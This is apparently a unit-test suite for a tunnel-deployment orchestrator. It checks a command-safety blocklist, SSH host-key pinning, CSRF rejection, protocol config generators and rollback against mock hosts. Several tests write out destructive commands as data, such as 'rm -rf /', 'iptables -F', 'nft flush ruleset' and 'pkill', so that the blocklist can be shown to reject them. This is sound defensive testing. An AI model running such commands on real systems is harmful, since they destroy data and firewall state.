#!/usr/bin/env python3
"""Offline unit and integration test suite for Tunnel Studio Pro v2.0.

Everything here runs against MockSSHClient, so it validates the orchestrator's own logic -
generated configs, scoring, gating, state handling - and proves nothing about a live host.
Real tunnel establishment, kernel behaviour, DPI resistance and throughput still require a
live run against actual servers.

Coverage:
1. Safety blocklist: blocks known destructive commands, allows the scoped teardowns we generate.
2. SSH TOFU hostkey pinning: pins on first use, matches on second, rejects on MITM key change.
3. SQLite correctness: raw jitter_ms recorded, no secrets persisted to disk.
4. Server-side port 443 release gating: rejects unconfirmed release or active user sessions.
5. Generators and teardowns for every protocol the live resolver currently returns.
6. Server-side CSRF protection: rejects cross-origin requests lacking the custom header.
7. Engine deployment lifecycle and automatic rollback on failure.
8. No credential ever reaches systemd argv, for any protocol on either host.
9. Supply-chain pinning: every installer hash and release URL resolves to the verified table.
10. Stability-metric semantics, probe persistence, and fail-safe behaviour when probing breaks.
11. Download-source ordering (GitHub before any mirror) and installer hygiene: LF line endings,
    one canonical fallback shared by both download paths, and no credential exposed through an
    ExecStart line or a world-readable config file.
12. Operational-data containment: a live session can point the database outside the repository so
    real host addresses never enter the working tree, while the default location stays unchanged.
"""
import unittest
import os
import sys
import time
import sqlite3
import json
import io
import ast
import inspect

# Ensure orchestrator directory is in python path
sys.path.insert(0, os.path.dirname(__file__))

import safety
import mock_ssh
import scoring
import storage
import protocols
import engine
import dashboard
import binary_manager
import verify_checksums
import failover
import failover_monitor
import probe
import vet_reality_covers
import hashlib
import re
import shutil
import contextlib
import subprocess
import tempfile

class FakeKey:
    def __init__(self, key_type, key_b64):
        self._type = key_type
        self._b64 = key_b64
    def get_name(self): return self._type
    def get_base64(self): return self._b64

class FakeClient:
    def __init__(self, port=22):
        self._port = port


class FlappingRawClient:
    """A paramiko-shaped session whose exec_command can be scripted to raise.

    SafeSSHRunner needs exactly three things from a transport: exec_command returning
    (stdin, stdout, stderr) where stdout carries a channel with recv_exit_status(), and close(). This
    provides them without importing paramiko, so the recovery paths are testable in the dry-run process
    the offline suite runs in. Every command it is given is recorded, which is how "was it issued
    twice?" becomes an assertion instead of an argument.
    """

    def __init__(self, raises=(), response="active\n", exit_status=0):
        self.raises = list(raises)
        self.commands = []
        self.closed = False
        self.response = response
        self.exit_status = exit_status

    def exec_command(self, cmd, timeout=30):
        self.commands.append(cmd)
        if self.raises:
            exc = self.raises.pop(0)
            if exc is not None:
                raise exc
        return None, mock_ssh.MockChannelFile(self.response, self.exit_status), \
            mock_ssh.MockChannelFile("", self.exit_status)

    def close(self):
        self.closed = True


def _product_bash() -> str | None:
    """The bash this suite executes shipped shell text with.

    On Windows, `shutil.which("bash")` can resolve to the WSL launcher
    (System32\\bash.exe), which is not the shell the operator's harness runs
    under and answers things like `chmod +x` with an unrelated proxy error -
    so Git Bash wins when it is installed. Everywhere else the PATH bash is
    the shell the product's units actually run under on the hosts. (T1: two
    tests used to re-implement this choice inline, and one of them forced the
    Git Bash path whenever it was *absent*, which is how the suite came to
    fail on Linux with a path that only exists on the author's machine.)
    """
    if os.name == "nt":
        git_bash = r"C:\Program Files\Git\bin\bash.exe"
        if os.path.exists(git_bash):
            return git_bash
    return shutil.which("bash")


BASH = _product_bash()

def bash_out(script: str, *args: str) -> str:
    """Run a shell snippet with positional args, returning stdout."""
    res = subprocess.run([BASH, "-c", script, "bash", *args], capture_output=True, text=True)
    assert res.returncode == 0, f"bash harness failed: {res.stderr[:200]}"
    return res.stdout

@contextlib.contextmanager
def env_vars(**values):
    """Set (or unset, when the value is None) environment variables for one assertion."""
    saved = {k: os.environ.get(k) for k in values}
    try:
        for key, value in values.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        yield
    finally:
        for key, value in saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

class RecordingRunner(mock_ssh.MockSSHClient):
    """A mock host that remembers every command it was issued, so "nothing secret reached argv" is an
    assertion rather than a reading of the source. Files still land in state["files"] through run(), so
    the pre-existing assertions about staged content keep working unchanged."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.commands = []

    def run(self, cmd, **kwargs):
        self.commands.append(cmd)
        return super().run(cmd, **kwargs)

    def issued(self) -> str:
        return "\n".join(self.commands)


def _seal_control_failopen():
    """A function whose body really does discard an rc, kept so test_110's source seal is shown able to
    fail. The seal strips comment lines before matching, which is the only reason it is trustworthy on a
    function that documents the pattern it forbids; this control is the proof that the stripping still
    sees live code."""
    return "ss -H -tln | grep -c ':443\\b' || true"


# #72, as two sources whose answer is known. Module level because the static seal below is only evidence
# once it is shown to bite: `unguarded_opens()` returning one documented site for the shipped tree means
# nothing unless the same function reports a tree that has the defect. The two snippets are the real
# `execute_failover` prologue before and after this round's fix - RFC 5737 addresses, no credential, and
# neither one is executed, they are only parsed.
_SEVENTY_TWO_BEFORE = '''
def execute_failover(pair, ir_runner, fr_runner, dry_run):
    created_ir = (ir_runner is None)
    created_fr = (fr_runner is None)
    if ir_runner is None:
        ir_runner = get_ssh_runner(pair["iran"], dry_run=dry_run, host_role="iran")
    if fr_runner is None:
        fr_runner = get_ssh_runner(pair["foreign"], dry_run=dry_run, host_role="foreign")
    t_start = time.time()
    try:
        work()
    finally:
        if created_ir:
            ir_runner.close()
        if created_fr:
            fr_runner.close()
'''

_SEVENTY_TWO_AFTER = '''
def execute_failover(pair, ir_runner, fr_runner, dry_run):
    created_ir = (ir_runner is None)
    created_fr = (fr_runner is None)
    try:
        if ir_runner is None:
            ir_runner = get_ssh_runner(pair["iran"], dry_run=dry_run, host_role="iran")
        if fr_runner is None:
            fr_runner = get_ssh_runner(pair["foreign"], dry_run=dry_run, host_role="foreign")
        t_start = time.time()
    except BaseException:
        if created_ir:
            ir_runner.close()
        if created_fr:
            fr_runner.close()
        raise
    try:
        work()
    finally:
        if created_ir:
            ir_runner.close()
        if created_fr:
            fr_runner.close()
'''


def _callee_of(call):
    fn = call.func
    if isinstance(fn, ast.Name):
        return fn.id
    if isinstance(fn, ast.Attribute):
        return fn.attr
    return ""


def _session_producers(tree):
    """`get_ssh_runner`, then every function that hands one back - derived from the tree, never typed.

    A hard-coded list would go stale the first time a second opener is written, and the census would
    then report a smaller tree rather than a safer one.
    """
    producers = {"get_ssh_runner"}
    changed = True
    while changed:
        changed = False
        for fn in [n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]:
            if fn.name in producers:
                continue
            returned = set()
            for node in ast.walk(fn):
                if isinstance(node, ast.Return) and node.value is not None:
                    elts = (node.value.elts if isinstance(node.value, ast.Tuple)
                            else [node.value])
                    returned |= {e.id for e in elts if isinstance(e, ast.Name)}
            for node in ast.walk(fn):
                if not isinstance(node, ast.Assign):
                    continue
                vals = node.value.elts if isinstance(node.value, ast.Tuple) else [node.value]
                if not any(isinstance(v, ast.Call) and _callee_of(v) in producers for v in vals):
                    continue
                names = []
                for tgt in node.targets:
                    elts = (tgt.elts if isinstance(tgt, (ast.Tuple, ast.List)) else [tgt])
                    names += [e.id for e in elts if isinstance(e, ast.Name)]
                if set(names) & returned:
                    producers.add(fn.name)
                    changed = True
                    break
    return producers


def extract_js_fn(source: str, header: str) -> str:
    """One function's exact source out of the dashboard page, by brace matching from its own header.

    Used instead of a regex or a line range because these renderers live inside one giant string: the
    extraction has to end where the function ends, or the node driver gets a truncated body and fails
    with a syntax error that looks like a broken renderer.
    """
    start = source.index(header)
    depth, end = 0, None
    for i, ch in enumerate(source[start:], start):
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                end = i + 1
                break
    if end is None:
        raise AssertionError(f"could not extract `{header}` from the page")
    return source[start:end]


def unguarded_opens(src: str):
    """Session-producing assignments that sit outside every `try` in their function: the #72 shape.

    Deliberately a structural question - "is some `Try` node on the way out to the function?" - and not
    a text search for `.close()`, because "a close exists somewhere in this function" is exactly the
    reading that let #71 look fixed while it was open: the closer was real, and unreachable.
    """
    tree = ast.parse(src)
    producers = _session_producers(tree)
    out = []
    for fn in [n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]:
        parents = {}
        for node in ast.walk(fn):
            for child in ast.iter_child_nodes(node):
                parents[child] = node
        for node in ast.walk(fn):
            if not isinstance(node, ast.Assign):
                continue
            vals = node.value.elts if isinstance(node.value, ast.Tuple) else [node.value]
            if not any(isinstance(v, ast.Call) and _callee_of(v) in producers for v in vals):
                continue
            cur, guarded = node, False
            while cur in parents:
                cur = parents[cur]
                if isinstance(cur, ast.Try):
                    guarded = True
                    break
            if not guarded:
                out.append((fn.name, node.lineno))
    return sorted(out)


# The fake netfilter the firewall-manifest tests run against. Module level because two tests use
# it: test_82 executes the shipped applier through it, test_83 replays the *deploy* commands
# through the same model to show what a second deploy does to a chain that already holds them.
# One model, two questions - a second fake could answer the second one differently.
_FAKE_IPTABLES = r"""#!/bin/bash
ST="${FAKE_IPT_STATE:?}"; LOG="${FAKE_IPT_LOG:?}"
echo "iptables $*" >> "$LOG"
table=filter; op=""
while [ $# -gt 0 ]; do
  case "$1" in
    -t) table="$2"; shift 2 ;;
    -A|-I|-D|-C) op="$1"; shift; break ;;
    -F|-N|-X|-P) echo "FORBIDDEN-OP:$1" >> "$LOG"; touch "$ST.flushed"; exit 0 ;;
    *) shift ;;
  esac
done
chain="$1"; shift
[ -f "$ST" ] || : > "$ST"
lines=()
while IFS= read -r l; do [ -n "$l" ] && lines+=("$l"); done < "$ST"
key="${table}|${chain}|"
if [ "$op" = "-I" ]; then pos="$1"; shift; fi
spec="$*"
[ "${FAKE_IPT_NEVER_MATCH:-0}" = 1 ] && { [ "$op" = "-C" ] && exit 1; }
case "$op" in
  -C)
    for l in "${lines[@]}"; do [ "$l" = "${key}${spec}" ] && exit 0; done
    exit 1 ;;
  -A)
    lines+=("${key}${spec}") ;;
  -D)
    out=(); dropped=0
    for l in "${lines[@]}"; do
      if [ "$dropped" = 0 ] && [ "$l" = "${key}${spec}" ]; then dropped=1; continue; fi
      out+=("$l")
    done
    [ "$dropped" = 1 ] || exit 1
    lines=("${out[@]}") ;;
  -I)
    idx=-1; seen=0
    for i in "${!lines[@]}"; do
      case "${lines[$i]}" in
"$key"*) seen=$((seen+1)); [ "$seen" -eq "$pos" ] && { idx=$i; break; } ;;
      esac
    done
    out=()
    if [ "$idx" -lt 0 ]; then lines+=("${key}${spec}");
    else
      for i in "${!lines[@]}"; do [ "$i" -eq "$idx" ] && out+=("${key}${spec}"); out+=("${lines[$i]}"); done
      lines=("${out[@]}")
    fi ;;
  *) echo "UNSUPPORTED-OP:$op" >> "$LOG"; exit 3 ;;
esac
: > "$ST"
[ "${#lines[@]}" -gt 0 ] && printf '%s\n' "${lines[@]}" >> "$ST"
exit 0
"""
_FAKE_IP = """#!/bin/bash
if [ "$1" = "link" ] && [ "$2" = "show" ]; then
  [ "$3" = "${FAKE_IFACE:-}" ] && exit 0
  exit 1
fi
exit 0
"""
_FAKE_SYSCTL = """#!/bin/bash
echo "sysctl $*" >> "${FAKE_SYSCTL_LOG:?}"
[ "${FAKE_SYSCTL_FAIL:-0}" = 1 ] && exit 1
exit 0
"""

def _fake_state_of(path):
    per = {}
    if not os.path.exists(path):
        return per
    with open(path, encoding="utf-8") as fh:
        for ln in fh:
            ln = ln.rstrip("\n")
            if not ln:
                continue
            t, c, spec = ln.split("|", 2)
            per.setdefault(f"{t}|{c}", []).append(spec)
    return per

def _fake_calls_of(path):
    if not os.path.exists(path):
        return []
    with open(path, encoding="utf-8") as fh:
        return [ln.rstrip("\n") for ln in fh if ln.strip()]


class TestSupervisoryCompliance(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.orig_db = storage.DB_PATH
        # Process-scoped, and that is the point: this class's fixture used to be one fixed path, so a
        # second process running any test of it deleted the first one's database at setUpClass and removed
        # it again at tearDownClass. Measured, not feared - a seal script and the full suite running
        # side by side produced `sqlite3.OperationalError: no such table: pairs` in two unrelated tests,
        # which reads exactly like a product regression and was entirely this harness. The delete-at-start
        # is still there for the aborted-run case the old comment described.
        cls.test_db = os.path.join(os.path.dirname(__file__), f"test_suite_isolated_{os.getpid()}.db")
        # Start from nothing. tearDownClass removes this file, but an aborted or interrupted run leaves
        # it behind, and its UNIQUE pairs then fail unrelated tests in the next run - a fixture collision
        # that reads like a product regression.
        if os.path.exists(cls.test_db):
            try:
                os.remove(cls.test_db)
            except OSError:
                pass
        storage.DB_PATH = cls.test_db
        storage.init_db()

    @classmethod
    def tearDownClass(cls):
        storage.DB_PATH = cls.orig_db
        if os.path.exists(cls.test_db):
            try:
                os.remove(cls.test_db)
            except Exception:
                pass

    def test_01_safety_regex_precision(self):
        """Verifies no false positives on safe paths and no false negatives on flushes."""
        # 1. FALSE POSITIVE FIX: Safe backups removal MUST be allowed
        self.assertTrue(safety.check_command_safe("rm -rf /root/tunnel-backups/port-443-12345"))
        self.assertTrue(safety.check_command_safe("rm -rf /tmp/test-tunnel-cache"))

        # 2. Critical system destruction MUST be blocked
        self.assertFalse(safety.check_command_safe("rm -rf /"))
        self.assertFalse(safety.check_command_safe("rm -rf /*"))
        self.assertFalse(safety.check_command_safe("rm -rf /etc"))
        self.assertFalse(safety.check_command_safe("rm -rf /var/log"))

        # 3. FALSE NEGATIVE FIX: All iptables/nft flushes MUST be blocked
        self.assertFalse(safety.check_command_safe("iptables -F"))
        self.assertFalse(safety.check_command_safe("iptables --flush"))
        self.assertFalse(safety.check_command_safe("iptables -t nat -F"))
        self.assertFalse(safety.check_command_safe("iptables -t nat --flush"))
        self.assertFalse(safety.check_command_safe("iptables -t mangle --flush"))
        self.assertFalse(safety.check_command_safe("ip6tables -t nat --flush"))
        self.assertFalse(safety.check_command_safe("nft flush ruleset"))
        self.assertFalse(safety.check_command_safe("nft flush table inet filter"))

        # 4. Blanket process killers
        self.assertFalse(safety.check_command_safe("pkill -f python"))
        self.assertFalse(safety.check_command_safe("killall nginx"))

    def test_02_tofu_hostkey_pinning(self):
        """Verifies Trust-On-First-Use pins key and rejects MITM changes."""
        host = f"test-tofu-{int(time.time()*1000)}.local"
        port = 22
        policy = mock_ssh.TOFUHostKeyPolicy()
        client = FakeClient(port=port)
        key1 = FakeKey("ssh-ed25519", "AAAAC3NzaC1lZDI1NTE5AAAAIOriginalKey11111111111")
        key_mitm = FakeKey("ssh-ed25519", "AAAAC3NzaC1lZDI1NTE5AAAAIFakeMitmKey99999999999")

        # 1. First connection: Pins key
        policy.missing_host_key(client, host, key1)
        pinned = storage.get_pinned_host_key(host, port)
        self.assertIsNotNone(pinned)
        self.assertEqual(pinned["key_base64"], key1.get_base64())

        # 2. Second connection with same key: OK
        policy.missing_host_key(client, host, key1)

        # 3. MITM connection with changed key: MUST RAISE EXCEPTION
        with self.assertRaises(Exception) as ctx:
            policy.missing_host_key(client, host, key_mitm)
        self.assertIn("Potential MITM attack detected", str(ctx.exception))

    def test_03_sqlite_data_correctness_and_jitter_ms(self):
        """Verifies raw jitter_ms in milliseconds is recorded in SQLite (not s_jit)."""
        pair_id = storage.add_pair(
            name=f"test_pair_jitter_{int(time.time()*1000)}",
            iran_host="198.51.100.10",
            foreign_host="203.0.113.20",
            frontend_port=443
        )
        # Evaluate metrics with raw jitter = 6.75 ms
        m = scoring.evaluate_tunnel_metrics(lat_avg=52.0, jitter=6.75, bulk_step=4, seconds_survived=30.0, loss_pct=0.0)
        self.assertEqual(m["breakdown"]["jitter_ms"], 6.75)

        # Record and fetch from SQLite
        bench_id = storage.record_benchmark(pair_id, "wstunnel-v10", m)
        benches = storage.get_benchmarks(pair_id)
        latest = benches[0]
        self.assertEqual(latest["jitter_ms"], 6.75)
        self.assertNotEqual(latest["jitter_ms"], m["breakdown"]["s_jit"])

        # Confirm Zero Secrets on disk
        with storage.db_session() as conn:
            cur = conn.cursor()
            cur.execute("PRAGMA table_info(pairs);")
            cols = [row["name"].lower() for row in cur.fetchall()]
            for sec in ["pass", "password", "key", "token", "secret", "private"]:
                self.assertNotIn(sec, cols)

    def test_04_server_side_port_gating_and_active_users(self):
        """Verifies server-side gate blocks unconfirmed port release and protects active users."""
        occupied_port_clean = {
            "port": 443,
            "is_listening": True,
            "process_name": "chisel",
            "pid": "550406",
            "active_connections": 0
        }
        occupied_port_busy = {
            "port": 443,
            "is_listening": True,
            "process_name": "chisel",
            "pid": "550406",
            "active_connections": 14  # Live active users
        }

        # 1. Blocked if not confirmed by user
        with self.assertRaises(PermissionError) as ctx:
            engine.validate_server_side_port_release(occupied_port_clean, force_confirmed=False)
        self.assertIn("SERVER GATE REJECTION", str(ctx.exception))

        # 2. Confirmed but active users exist: Blocked by default to protect users
        with self.assertRaises(PermissionError) as ctx:
            engine.validate_server_side_port_release(occupied_port_busy, force_confirmed=True, override_active_users=False)
        self.assertIn("active live client connections", str(ctx.exception))

        # 3. Confirmed with explicit active user override: Allowed
        engine.validate_server_side_port_release(occupied_port_busy, force_confirmed=True, override_active_users=True)

    def test_05_all_supported_protocol_generators_and_teardown(self):
        """Verifies generators and teardowns for every protocol in SUPPORTED_PROTOCOLS."""
        pair_id = 7
        ir_ip = "198.51.100.10"
        fr_ip = "203.0.113.20"
        frontend = 443

        for proto in protocols.SUPPORTED_PROTOCOLS:
            plan = protocols.generate_deployment(proto, pair_id, ir_ip, fr_ip, frontend)
            self.assertEqual(plan["protocol"], proto)
            self.assertIn("teardown_iran", plan)
            self.assertIn("teardown_foreign", plan)

            # GRE Specifics: Interface unit, subnet, protocol 47, and explicit nat+filter teardown
            if proto == "GRE":
                gre_unit = plan["iran_files"].get(f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-gre.service", "")
                self.assertIn("grep7", gre_unit)
                self.assertIn("10.10.17.1", gre_unit)
                self.assertIn("-p 47", " ".join(plan["iran_cmds"]))
                # Teardown MUST include -t nat and proto 47
                td_str = " ".join(plan["teardown_iran"])
                self.assertIn("-t nat -D PREROUTING", td_str)
                self.assertIn("-D FORWARD", td_str)
                self.assertIn("-D INPUT -p 47", td_str)

            # Wstunnel Specifics: No --listen, reverse -R, secret path
            if proto == "wstunnel-v10":
                srv = plan["iran_files"].get(f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-wstunnel-server.service", "")
                cln = plan["foreign_files"].get(f"/etc/systemd/system/best-tunnel-prod-p{pair_id}-wstunnel-client.service", "")
                self.assertIn("wss://0.0.0.0:2096", srv)
                self.assertNotIn("--listen", srv)
                self.assertNotIn("--restrict-to", srv)  # avoid conflict in reverse
                self.assertIn("-R \"tcp://0.0.0.0:443:127.0.0.1:443\"", cln)

            # Xray Reverse Specifics: Dynamic UUID, portal & bridge units
            if proto == "xray-reverse":
                self.assertEqual(len(plan["iran_units"]), 1)
                self.assertEqual(len(plan["foreign_units"]), 1)
                self.assertIn("portal", plan["iran_units"][0])
                self.assertIn("bridge", plan["foreign_units"][0])

    def test_06_server_side_csrf_rejection(self):
        """Verifies server strictly enforces CSRF headers without vulnerable Origin/Referer fallbacks."""
        class MockHandler:
            def __init__(self, headers):
                self.headers = headers
            check_csrf = dashboard.H.check_csrf

        # 1. Fully compliant request -> Allowed
        h_ok = MockHandler({
            "X-Best-Tunnel-CSRF": "1",
            "Host": "127.0.0.1:8800",
            "Content-Type": "application/json"
        })
        self.assertTrue(h_ok.check_csrf())

        # 2. Senior Architect Mandatory Test: Evil Referer bypass attempt -> MUST BE REJECTED (False)
        h_evil_ref = MockHandler({
            "Referer": "http://evil.com/127.0.0.1:8800",
            "Host": "127.0.0.1:8800",
            "Content-Type": "text/plain"
        })
        self.assertFalse(h_evil_ref.check_csrf())

        # 3. Missing custom header even with valid Host -> MUST BE REJECTED
        h_missing_hdr = MockHandler({
            "Host": "127.0.0.1:8800",
            "Content-Type": "application/json"
        })
        self.assertFalse(h_missing_hdr.check_csrf())

        # 4. Wrong Content-Type (e.g. text/plain from standard form) -> MUST BE REJECTED
        h_wrong_type = MockHandler({
            "X-Best-Tunnel-CSRF": "1",
            "Host": "127.0.0.1:8800",
            "Content-Type": "text/plain"
        })
        self.assertFalse(h_wrong_type.check_csrf())

        # 5. Invalid Host header -> MUST BE REJECTED
        h_bad_host = MockHandler({
            "X-Best-Tunnel-CSRF": "1",
            "Host": "evil.com",
            "Content-Type": "application/json"
        })
        self.assertFalse(h_bad_host.check_csrf())

    def test_07_engine_deployment_and_rollback(self):
        """Verifies real deployment workflow and rollback mechanism on mock runner."""
        unique_name = f"mock_deploy_pair_{int(time.time()*1000)}"
        pair_id = storage.add_pair(
            name=unique_name,
            iran_host="198.51.100.10",
            foreign_host="203.0.113.20",
            frontend_port=443
        )
        mock_pair = {
            "id": pair_id,
            "name": unique_name,
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        # Deploy wstunnel-v10 in mock dry-run mode
        res = engine.deploy_tunnel(mock_pair, "wstunnel-v10", dry_run=True, force_confirmed=True)
        self.assertTrue(res["ok"])
        self.assertEqual(res["status"], "ACTIVE-wstunnel-v10-443")

    def test_08_conntrack_single_script_execution(self):
        """Verifies conntrack tuning is emitted as one script so its shell variables survive."""
        cmds = protocols.conntrack_tuning_cmds()
        self.assertEqual(len(cmds), 1)
        script = cmds[0]
        self.assertTrue(script.startswith("bash -c '"))
        self.assertIn("TARGET_CONN", script)
        self.assertIn("HASH_SIZE", script)
        self.assertIn("sysctl -w net.netfilter.nf_conntrack_max=$TARGET_CONN", script)

    def test_09_safety_root_directory_guard(self):
        """Verifies rm -rf /root (and /root/) is strictly blocked while /root/tunnel-backups is allowed."""
        self.assertFalse(safety.check_command_safe("rm -rf /root"))
        self.assertFalse(safety.check_command_safe("rm -rf /root/"))
        self.assertFalse(safety.check_command_safe("rm -rf /root/*"))
        self.assertFalse(safety.check_command_safe("rm -rf /boot"))
        self.assertFalse(safety.check_command_safe("rm -rf /home"))
        # But subdirectories for backups are explicitly permitted
        self.assertTrue(safety.check_command_safe("rm -rf /root/tunnel-backups/item1"))
        self.assertTrue(safety.check_command_safe("rm -rf /root/tunnel-backups/"))

    def test_10_in_tunnel_benchmark_dry_run(self):
        """Verifies in-tunnel benchmark workflow deploys, benchmarks, teardowns, and scores."""
        pair_id = storage.add_pair(
            name=f"test_bench_pair_{int(time.time()*1000)}",
            iran_host="198.51.100.10",
            foreign_host="203.0.113.20",
            frontend_port=443
        )
        mock_pair = {
            "id": pair_id,
            "name": f"test_bench_pair_{pair_id}",
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        res = engine.run_single_benchmark(mock_pair, "backhaul-wss", dry_run=True)
        self.assertIn("score", res)
        self.assertIn("breakdown", res)
        self.assertIn("jitter_ms", res["breakdown"])
        self.assertGreater(res["score"], 0)

    def test_11_simulated_live_benchmark_gre_and_socket(self):
        """Simulates full live (dry_run=False) benchmarking for GRE and socket tunnels with Mock runners."""
        pair_id = storage.add_pair(
            name=f"test_live_sim_{int(time.time()*1000)}",
            iran_host="198.51.100.10",
            foreign_host="203.0.113.20",
            frontend_port=443
        )
        mock_pair = {
            "id": pair_id,
            "name": f"test_live_sim_{pair_id}",
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }

        # 1. GRE Protocol Live Path Simulation
        mock_ir_gre = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr_gre = mock_ssh.MockSSHClient(host_role="foreign")
        res_gre = engine.run_single_benchmark(mock_pair, "GRE", dry_run=False, ir_runner=mock_ir_gre, fr_runner=mock_fr_gre)
        self.assertEqual(res_gre["protocol"], "GRE")
        self.assertEqual(res_gre["bulk_step"], 4)
        self.assertGreaterEqual(res_gre["breakdown"]["seconds_survived"], 25.0)
        self.assertFalse(res_gre["disqualified"])
        self.assertGreater(res_gre["score"], 65.0)
        self.assertEqual(res_gre["breakdown"]["jitter_ms"], 2.1)
        self.assertIn("overhead_ratio", res_gre["breakdown"])
        self.assertGreaterEqual(res_gre["breakdown"]["overhead_ratio"], 0.0)
        # Verify Foreign backend script was deployed listening on 0.0.0.0:8898 on FOREIGN runner
        self.assertIn("/tmp/best_test_backend.py", mock_fr_gre.state["files"])
        self.assertIn("('0.0.0.0', 8898)", mock_fr_gre.state["files"]["/tmp/best_test_backend.py"])

        # 2. Socket Tunnel (backhaul-wss) Live Path Simulation
        mock_ir_sock = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr_sock = mock_ssh.MockSSHClient(host_role="foreign")
        res_sock = engine.run_single_benchmark(mock_pair, "backhaul-wss", dry_run=False, ir_runner=mock_ir_sock, fr_runner=mock_fr_sock)
        self.assertEqual(res_sock["protocol"], "backhaul-wss")
        self.assertEqual(res_sock["bulk_step"], 4)
        self.assertGreaterEqual(res_sock["breakdown"]["seconds_survived"], 25.0)
        self.assertFalse(res_sock["disqualified"])
        self.assertGreater(res_sock["score"], 65.0)
        self.assertEqual(res_sock["breakdown"]["jitter_ms"], 3.8)
        self.assertIn("overhead_ratio", res_sock["breakdown"])
        # Dynamic base_rtt overhead verification (Senior Architect C3: overhead_ratio != 0.0)
        self.assertGreater(res_sock["breakdown"]["overhead_ratio"], 0.0)

    def test_12_ladder_failure_correctly_triggers_disqualification(self):
        """Verifies that a dropped or stalled tunnel in live ladder step 3 is strictly disqualified."""
        pair_id = 99
        mock_pair = {
            "id": pair_id,
            "name": "test_failure_sim",
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        mock_ir_fail = mock_ssh.MockSSHClient(host_role="iran")
        mock_fr_fail = mock_ssh.MockSSHClient(host_role="foreign")
        # Inject simulated ladder failure at 100k step
        mock_ir_fail.state["fail_ladder_at_step"] = "100k"

        res_fail = engine.run_single_benchmark(mock_pair, "rathole-noise", dry_run=False, ir_runner=mock_ir_fail, fr_runner=mock_fr_fail)
        self.assertEqual(res_fail["bulk_step"], 2)  # Step 1 and 2 passed, 3 failed
        self.assertTrue(res_fail["disqualified"])
        self.assertLess(res_fail["breakdown"]["seconds_survived"], 25.0)
        self.assertIn("Failed 1MB bulk ladder hard-gate (stream stall/DPI freeze)", res_fail["dq_reasons"])
        self.assertTrue(any("Connection dropped under 25s" in r for r in res_fail["dq_reasons"]))

    def test_13_profile_scoring_and_kcptun(self):
        """Verifies multi-profile scoring (Balanced, Gaming, UltraSpeed) and KCP-FEC protocol integration."""
        # 1. Multi-profile scoring
        res_bal = scoring.evaluate_tunnel_metrics(lat_avg=45.0, jitter=1.5, bulk_step=4, seconds_survived=30.0, loss_pct=0.0, profile="balanced")
        res_gam = scoring.evaluate_tunnel_metrics(lat_avg=45.0, jitter=1.5, bulk_step=4, seconds_survived=30.0, loss_pct=0.0, profile="gaming")
        res_spd = scoring.evaluate_tunnel_metrics(lat_avg=45.0, jitter=1.5, bulk_step=4, seconds_survived=30.0, loss_pct=0.0, profile="ultraspeed")

        self.assertIn("scores_by_profile", res_bal)
        self.assertIn("gaming", res_bal["scores_by_profile"])
        self.assertIn("ultraspeed", res_bal["scores_by_profile"])
        self.assertGreater(res_gam["score"], 90.0)
        self.assertGreater(res_spd["score"], 90.0)

        # 2. Protocol generation for kcptun (the 8th base protocol). Asserted against the base
        #    set so the sing-box opt-in toggle cannot change the outcome of this test.
        active = protocols.get_supported_protocols()
        self.assertEqual(active[:len(protocols.BASE_PROTOCOLS)], protocols.BASE_PROTOCOLS)
        self.assertIn("kcptun", active)

        plan = protocols.generate_deployment("kcptun", 96, "198.51.100.10", "203.0.113.20", 443)
        self.assertEqual(plan["protocol"], "kcptun")
        self.assertEqual(len(plan["iran_units"]), 1)
        self.assertEqual(len(plan["foreign_units"]), 1)
        self.assertIn("kcptun-client", plan["iran_units"][0])
        self.assertIn("kcptun-server", plan["foreign_units"][0])
        self.assertTrue(len(plan["teardown_iran"]) >= 2)

        # 3. Benchmark simulation for kcptun
        mock_pair = {
            "id": 96,
            "name": "test_kcptun",
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        res_kcp = engine.run_single_benchmark(mock_pair, "kcptun", dry_run=True, profile="gaming")
        self.assertEqual(res_kcp["protocol"], "kcptun")
        self.assertFalse(res_kcp["disqualified"])
        self.assertGreater(res_kcp["score"], 90.0)
        self.assertEqual(res_kcp["profile"], "gaming")

    def test_14_host_isolation_across_every_active_protocol(self):
        """Verifies that for every protocol the registry currently resolves, foreign files land
        exclusively on fr_runner and iran files on ir_runner. Driven by SUPPORTED_PROTOCOLS rather than
        a hardcoded count, so a new generator is covered the day it is registered."""
        pair_id = 88
        mock_pair = {
            "id": pair_id,
            "name": "test_host_isolation",
            "frontend": 443,
            "iran": {"host": "198.51.100.10", "port": 22},
            "foreign": {"host": "203.0.113.20", "port": 22}
        }
        for proto in protocols.SUPPORTED_PROTOCOLS:
            mock_ir = mock_ssh.MockSSHClient(host_role="iran")
            mock_fr = mock_ssh.MockSSHClient(host_role="foreign")

            res = engine.deploy_tunnel(
                pair=mock_pair,
                choice=proto,
                dry_run=False,
                force_confirmed=True,
                ir_runner=mock_ir,
                fr_runner=mock_fr
            )
            self.assertTrue(res["ok"], f"Deployment failed for {proto}")

            plan = protocols.generate_deployment(proto, pair_id, "198.51.100.10", "203.0.113.20", 443)
            # Verify Iran files are on mock_ir, and foreign-exclusive files did not leak to mock_ir
            for fpath in plan.get("iran_files", {}).keys():
                self.assertIn(fpath, mock_ir.state["files"], f"Iran file {fpath} missing from Iran runner for {proto}")
                if fpath not in plan.get("foreign_files", {}):
                    self.assertNotIn(fpath, mock_fr.state["files"], f"Iran file {fpath} leaked to Foreign runner for {proto}")

